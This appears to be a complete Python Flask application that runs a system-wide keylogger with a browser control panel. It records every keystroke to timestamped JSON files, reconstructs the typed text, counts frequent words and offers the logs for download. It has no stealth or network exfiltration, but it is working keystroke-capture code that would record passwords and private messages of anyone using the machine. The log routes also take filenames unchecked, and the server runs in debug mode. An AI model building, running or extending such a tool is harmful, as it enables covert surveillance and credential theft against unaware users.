from flask import Flask, render_template, request, jsonify, send_file
import os
import threading
import time
from datetime import datetime
import json
from pynput import keyboard
import signal
import sys

app = Flask(__name__)

# Global variables
keylogger_thread = None
keylogger_active = False
current_log_file = None
log_directory = "keylogs"

# Ensure log directory exists
os.makedirs(log_directory, exist_ok=True)

class KeyLogger:
    def __init__(self, log_file):
        self.log_file = log_file
        self.listener = None
        
    def on_press(self, key):
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Handle special keys
            if hasattr(key, 'char') and key.char is not None:
                key_data = {
                    'timestamp': timestamp,
                    'key': key.char,
                    'type': 'character'
                }
            else:
                key_data = {
                    'timestamp': timestamp,
                    'key': str(key),
                    'type': 'special'
                }
            
            # Write to file
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(json.dumps(key_data) + '\n')
                
        except Exception as e:
            print(f"Error logging key: {e}")
    
    def start_logging(self):
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        
    def stop_logging(self):
        if self.listener:
            self.listener.stop()

def keylogger_worker():
    global keylogger_active, current_log_file
    
    # Create log file with timestamp
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    current_log_file = os.path.join(log_directory, f"keylog_{timestamp}.json")
    
    # Initialize keylogger
    keylogger = KeyLogger(current_log_file)
    keylogger.start_logging()
    
    # Keep thread alive while keylogger is active
    while keylogger_active:
        time.sleep(0.1)
    
    # Stop keylogger
    keylogger.stop_logging()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start', methods=['POST'])
def start_keylogger():
    global keylogger_thread, keylogger_active
    
    if not keylogger_active:
        keylogger_active = True
        keylogger_thread = threading.Thread(target=keylogger_worker)
        keylogger_thread.daemon = True
        keylogger_thread.start()
        return jsonify({'status': 'started', 'message': 'Keylogger started successfully'})
    else:
        return jsonify({'status': 'already_running', 'message': 'Keylogger is already running'})

@app.route('/stop', methods=['POST'])
def stop_keylogger():
    global keylogger_active
    
    if keylogger_active:
        keylogger_active = False
        return jsonify({'status': 'stopped', 'message': 'Keylogger stopped successfully'})
    else:
        return jsonify({'status': 'not_running', 'message': 'Keylogger is not running'})

@app.route('/status')
def get_status():
    return jsonify({
        'active': keylogger_active,
        'current_file': current_log_file if keylogger_active else None
    })

@app.route('/files')
def list_files():
    try:
        files = []
        for filename in os.listdir(log_directory):
            if filename.endswith('.json'):
                filepath = os.path.join(log_directory, filename)
                file_stats = os.stat(filepath)
                files.append({
                    'name': filename,
                    'size': file_stats.st_size,
                    'modified': datetime.fromtimestamp(file_stats.st_mtime).strftime("%Y-%m-%d %H:%M:%S")
                })
        
        # Sort by modification time (newest first)
        files.sort(key=lambda x: x['modified'], reverse=True)
        return jsonify({'files': files})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/view/<filename>')
def view_file(filename):
    try:
        filepath = os.path.join(log_directory, filename)
        if not os.path.exists(filepath):
            return jsonify({'error': 'File not found'})
        
        # Read and parse the log file
        entries = []
        with open(filepath, 'r', encoding='utf-8') as f:
            for line in f:
                try:
                    entry = json.loads(line.strip())
                    entries.append(entry)
                except json.JSONDecodeError:
                    continue
        
        # Process entries to reconstruct text
        processed_data = process_keylog_entries(entries)
        
        return jsonify({
            'entries': entries,
            'processed': processed_data
        })
    except Exception as e:
        return jsonify({'error': str(e)})

def process_keylog_entries(entries):
    """Process keylog entries to reconstruct readable text and provide analytics"""
    
    # Build text character by character for accuracy
    full_text = ""
    special_keys_count = {}
    
    for entry in entries:
        key = entry['key']
        key_type = entry['type']
        
        if key_type == 'character':
            full_text += key
        else:
            # Handle special keys
            key_name = key.replace('Key.', '').lower()
            
            # Count special keys
            if key_name in special_keys_count:
                special_keys_count[key_name] += 1
            else:
                special_keys_count[key_name] = 1
            
            if key_name == 'space':
                full_text += " "
            elif key_name == 'enter':
                full_text += "\n"
            elif key_name == 'tab':
                full_text += "\t"
            elif key_name == 'backspace':
                # Simply remove the last character
                if len(full_text) > 0:
                    full_text = full_text[:-1]
            elif not any(modifier in key_name for modifier in ['shift', 'ctrl', 'alt', 'cmd']):
                # Show other special keys (but ignore modifiers)
                full_text += f"[{key_name.upper()}]"
    
    # Extract words for analytics
    words_typed = [word for word in full_text.split() if len(word.strip()) > 0]
    
    # Create analytics
    analytics = {
        'total_keys': len(entries),
        'total_words': len(words_typed),
        'total_characters': sum(1 for entry in entries if entry['type'] == 'character'),
        'special_keys': special_keys_count,
        'most_used_words': get_word_frequency(words_typed),
        'session_duration': get_session_duration(entries)
    }
    
    return {
        'reconstructed_text': full_text,
        'analytics': analytics,
        'word_list': words_typed
    }

def get_word_frequency(words):
    """Get frequency of words typed"""
    from collections import Counter
    # Clean words and filter out very short words and special characters
    cleaned_words = []
    for word in words:
        # Remove special characters and convert to lowercase
        clean_word = ''.join(char.lower() for char in word if char.isalnum())
        if len(clean_word) > 2:  # Only words longer than 2 characters
            cleaned_words.append(clean_word)
    
    word_count = Counter(cleaned_words)
    return dict(word_count.most_common(10))

def get_session_duration(entries):
    """Calculate session duration"""
    if len(entries) < 2:
        return "Less than 1 minute"
    
    start_time = datetime.strptime(entries[0]['timestamp'], "%Y-%m-%d %H:%M:%S")
    end_time = datetime.strptime(entries[-1]['timestamp'], "%Y-%m-%d %H:%M:%S")
    duration = end_time - start_time
    
    hours = duration.seconds // 3600
    minutes = (duration.seconds % 3600) // 60
    
    if hours > 0:
        return f"{hours}h {minutes}m"
    else:
        return f"{minutes}m"

@app.route('/download/<filename>')
def download_file(filename):
    try:
        filepath = os.path.join(log_directory, filename)
        if not os.path.exists(filepath):
            return jsonify({'error': 'File not found'})
        
        return send_file(filepath, as_attachment=True)
    except Exception as e:
        return jsonify({'error': str(e)})

# Graceful shutdown
def signal_handler(sig, frame):
    global keylogger_active
    keylogger_active = False
    print('\nShutting down keylogger...')
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

if __name__ == '__main__':
    app.run(debug=True, host='127.0.0.1', port=5000)